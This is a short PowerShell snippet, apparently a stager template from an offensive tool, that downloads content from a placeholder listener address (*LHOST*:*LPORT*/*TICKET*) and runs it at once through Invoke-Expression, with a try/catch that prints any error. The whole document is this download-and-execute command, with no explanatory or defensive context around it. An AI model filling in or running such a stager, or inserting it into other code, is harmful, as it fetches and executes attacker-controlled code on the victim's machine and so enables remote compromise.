try {
    IWR -Uri "http://*LHOST*:*LPORT*/*TICKET*" -UseBasicParsing | Select-Object -ExpandProperty Content | IEX;
} catch {
    Write-Host "Error: $($_.Exception.Message)";
}
